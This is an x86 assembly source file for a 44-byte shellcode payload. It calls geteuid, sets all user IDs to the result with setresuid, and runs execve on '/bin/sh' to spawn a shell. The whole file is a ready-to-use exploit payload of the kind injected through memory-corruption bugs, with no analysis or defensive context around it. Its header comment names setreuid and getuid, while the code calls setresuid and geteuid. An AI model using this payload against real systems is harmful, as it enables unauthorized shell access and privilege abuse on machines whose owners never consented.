; x86 setresuid execve shellcode (44 bytes)
;   
;     setreuid(getuid(), getuid());
;     execve("/bin/sh");  

bits 32
global _start

section .text
_start:
        nop
       
        ; call geteuid
        xor eax, eax
        mov al, 0x31
        int 0x80

        ; call setresuid
        mov ebx, eax
        mov ecx, eax
        mov edx, eax
        xor eax, eax
        mov al, 0xa4
        int 0x80

        ; call execve
        xor eax, eax
        push eax
        push 0x68732f6e
        push 0x69622f2f
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
